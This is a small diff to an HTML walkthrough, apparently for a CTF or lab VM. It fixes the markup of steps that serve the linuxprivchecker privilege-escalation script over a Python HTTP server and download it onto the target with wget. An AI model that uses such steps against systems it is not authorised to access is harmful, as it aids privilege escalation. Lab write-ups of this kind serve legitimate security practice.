@@ -176,7 +176,7 @@ If you're on Linux edit your "/etc/hosts" file and add:<br>
     <li>Download the linuxprivchecker file locally</li>
     <li>Navigate to the file on your file system</li>
     <li>Do: <code>python -m SimpleHTTPServer 1337</code>code> (leave this running)</li>
-    <li>On the VM you can now do: <code>wget [your IP]/<file>.py</file>code></li>
+    <li>On the VM you can now do: <code>wget [your IP]/[file].py</code></li>
 </ul></p>
 
 <h3><strong>OR</strong></h3>
